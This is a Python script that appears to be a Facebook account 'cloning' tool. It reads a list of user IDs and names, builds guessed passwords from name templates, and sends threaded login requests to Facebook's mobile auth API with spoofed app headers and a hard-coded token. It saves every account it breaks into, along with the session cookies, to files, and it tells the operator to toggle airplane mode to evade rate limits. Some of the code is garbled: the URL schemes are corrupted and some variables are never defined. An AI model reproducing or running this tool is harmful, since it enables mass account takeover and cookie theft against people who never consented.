
import os,zlib
import os,sys,time,random,requests
from bs4 import BeautifulSoup as bs
from os import system as osRUB
from os import system as cmd
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] LOADING MODULES ')
try:
    import requests 
except ImportError:
    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING REQUESTS ')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as Habib
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit

totaldmp = 0
count = 0
loop = 0
oks = []
cgold20 = []
id = []
gold20 = []
gold10 = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]

sys.stdout.write('\x1b]2; CR7\x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}

A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'

def cek_apk(session,coki):
  w=session.get("httgold20://mbasic.facebook.com/settings/apgold20/tabbed/?tab=active",cookies={"cookie":coki}).text
  sop = BeautifulSoup(w,"html.parser")
  x = sop.find("form",method="post")
  game = [i.text for i in x.find_all("h3")]
  if len(game)==0:
    print(f'\r  {BG}[{W}•{BG}] {W}SORRY THERE IS NO ACTIVE APK{E}')
  else:
    print(f'\r{BG}  [{W}•{BG}]{W} YOUR ACTIVE APPLICATION DETAILS{E} ')
    for i in range(len(game)):
      print(f"\r%s  [%s] %s %s "%(G,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),E))
  w=session.get("httgold20://mbasic.facebook.com/settings/apgold20/tabbed/?tab=inactive",cookies={"cookie":coki}).text
  sop = BeautifulSoup(w,"html.parser")
  x = sop.find("form",method="post")
  game = [i.text for i in x.find_all("h3")]
  if len(game)==0:
    print(f'\r{BG}  [{W}•{BG}]{W} SORRY THERE IS NO EXPIRED APK{W}')
  else:
    print(f'\r  {BG}[{W}•{BG}]{W} YOUR EXPIRED APPLICATION DETAILS{E}')
    for i in range(len(game)):
      print(f"\r%s  [%s] %s %s "%(S,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),E))
def clear():os.system('clear');print(logo)
def linex():print(f'{A}──────────────────────────────────────────────────')

logo =f"""{A}

{G1}  ┏┓      ┏┓ ┏┓             ┏┓
{G2}  ┃┃      ┃┃ ┃┃             ┃┃
{G3}  ┃┃┏━━┓┏┓┃┃ ┃┗━┓┏━┓┏━━┓┏━━┓┃┃┏┓
{G4}┏┓┃┃┃┏┓┃┣┫┃┃ ┃┏┓┃┃┏┛┃┃━┫┃┏┓┃┃┗┛┛
{G5}┃┗┛┃┃┏┓┃┃┃┃┗┓┃┗┛┃┃┃ ┃┃━┫┃┏┓┃┃┏┓┓
{G1}┗━━┛┗┛┗┛┗┛┗━┛┗━━┛┗┛ ┗━━┛┗┛┗┛┗┛┗┛ {G1}[{A}king{G1}/{A}0.1{G1}]
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} DEV    {A}:{G1} CR7 
{A}──────────────────────────────────────────────────"""

def result(OKs,cgold20):
    if len(OKs) != 0 or len(cgold20) != 0:
        print(f'\r{A}──────────────────────────────────────────────────')
        print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETE...')
        print(f'{G1}[{A}={G2}]{G2} TOTAL OK {A}:{G2} %s' % str(len(oks)))
        print(f'{G1}[{A}={G2}]{G3} TOTAL CP {A}:{G3} %s' % str(len(cgold20)))
        print(f'\r{A}──────────────────────────────────────────────────')
        input(f"{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ")
        exit()

def menu():   
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
    print(f'{G1}[{A}2{G3}]{G3} CONTACT TOOL OWNER')
    print(f'{G1}[{A}0{G4}]{G4} EXIT TOOLS')
    linex()
    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
    if select =='1':
        _file_()
    elif select =='2':
        os.system('xdg-open https://t.me/CR70l');menu()
    elif select =='3':
        os.system('xdg-open https://t.me/CR70l');menu()
    elif select =='0':
        exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
    else:
        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
        time.sleep(2)
        menu()

     
def _file_():
    global methods
    clear()
    print(f'{G1}[{A}1{G1}]{G1} METHOD {G1}[{A}M1{G1}]{G1} ')
    print(f'{G1}[{A}2{G2}]{G2} METHOD {G2}[{A}M2{G2}]{G1} ')
    linex()
    option = input(f'{G1}[{A}?{G3}]{G3} CHOICE {A}:{G3} ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='0':
        _file_()
    else:
      print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
      time.sleep(2)
      _file_()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/CR7.txt');linex()
        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{G1}[{A}={G2}]{G2} OPgold20 FILE NOT FOUND ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
            time.sleep(2)
            main_crack().crack(id)
          
    def methodA(self, gold10, name, gold20w):
        try:
            global oks,cgold20,loop
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
            sys.stdout.write(f"\r{G1}[{A}SAWG-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cgold20)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in gold20w:
                gold20 = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": gold10,
                    "password": gold20,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("httgold20://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);CR7b = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CR7b};{ckkk}"
                    print(f"\r\r{G1}[CR7-OK] {gold10} | {gold20} ")
                    open('/sdcard/CR7-M1-FILE-OK.txt','a').write(gold10+'|'+gold20+'|'+cookie+'\n')
                    oks.append(gold10)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[CR7-CP] {gold10} | {gold20} ")
                     open('/sdcard/CR7-M2-FILE-OK.txt','a').write(gold10+'|'+gold20+'\n')
                     cgold20.append(gold10)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(gold10, name, gold20)
             
    def methodB(self, gold10, name, gold20w):
        try:
            global oks,cgold20,loop
            sys.stdout.write(f"\r{G1}[{A}SAWG-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cgold20)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in gold20w:
                gold20 = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": gold10,
                    "password": gold20,
                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("httgold20://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);CR7b = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={CR7b};{ckkk}"
                    print(f"\r\r{G1}[CR7-OK] {gold10} | {gold20} ")
                    cek_apk(session,coki)
                    open('/sdcard/CR7-M2-FILE-OK.txt','a').write(gold10+'|'+gold20+'|'+cookie+'\n')
                    oks.append(gold10)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{M}[CR7-CP] {gold10} | {gold20} ")
                    open('/sdcard/CR7-M2-FILE-OK.txt','a').write(gold10+'|'+gold20+'\n')
                    cgold20.append(gold10)
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(gold10, name, gold20)

    def pasw(self):       
            pw = []
            clear()
            print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} BD 10-18/INDIA 3-5');linex()
            sl = int(input(f'{G1}[{A}?{G3}]{G3} PASSWORD LIMIT {A}:{G3} '))
            clear()
            print(f'{G1}[{A}?{G4}]{G4} EXAMPLE {A}:{G4} first123/firstlast/first@@@')
            linex()
            if sl =='':
                print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 30')
            elif sl > 20:
                print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'{G1}[{A}={G1}]{G1} PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} '))
            clear()
            print(f'{G1}[{A}={G1}]{G1} TOTAL FILE UID {A}:{G1} %s ' % len(self.id))
            print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl} ')
            print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
            linex()
            with Habib(max_workers=30) as CR7world:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                CR7world.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                CR7world.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cgold20)

def randm(gold404,gold20d):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}SAWG-XD{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in gold20d:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':gold404,
            'password':gold707,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'WIFI',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'httgold20://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                gold25 = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f'\r\r{G1}[CR7-OK] {gold404} | {gold707}')
                print(f'\r\r{G1}[COOKIE]{A} {gold25}')
                cek_apk(session,coki)
                open('/sdcard/CR7-FILE-OK.txt','a').write(gold404+'|'+gold707+'|'+gold25+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
          
menu()
#__________________[ GOLDEN ]__________________#